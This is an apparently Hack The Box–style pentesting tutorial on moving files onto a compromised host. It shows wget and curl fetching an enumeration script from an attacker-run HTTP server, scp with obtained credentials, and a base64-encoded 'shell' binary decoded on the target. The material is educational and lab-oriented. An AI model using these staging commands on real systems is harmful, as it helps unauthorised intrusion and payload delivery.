# Transferring Files

## Using wget

First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it:

    MBWest@htb[/htb]$ cd /tmp
    MBWest@htb[/htb]$ python3 -m http.server 8000

Now that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:

    user@remotehost$ wget http://10.10.14.1:8000/linenum.sh

### Using cURL

Note that we used our IP `10.10.14.1` and the port our Python server runs on `8000`. If the remote server does not have wget, we can use cURL to download the file:

    user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

Note that we used the -o flag to specify the output file name.

## Using SCP

Another method to transfer files would be using `scp`, granted we have obtained ssh user credentials on the remote host. We can do so as follows:

    MBWest@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

    user@remotehost's password: *********
    linenum.sh

## Using base64

In some cases, we may not be able to transfer the file. For example, if we wanted to transfer a binary file called `shell`, we can `base64` encode it as follows:

    MBWest@htb[/htb]$ base64 shell -w 0

Now, we can copy this `base64` string, go to the remote host, and use `base64` `-d` to decode it, and pipe the output into a file:

    user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell

## Validating File Transfers

To validate the format of a file, we can run the `file` command on it:

    user@remotehost$ file shell
    shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header

As we can see, when we run the `file` command on the `shell` file, it says that it is an ELF binary, meaning that we successfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, we can run `md5sum` on it:

  
    MBWest@htb[/htb]$ md5sum shell

    321de1d7e7c3735838890a72c9ae7d1d shell

Now, we can go to the remote server and run the same command on the file we transferred:
  
    user@remotehost$ md5sum shell

    321de1d7e7c3735838890a72c9ae7d1d shell
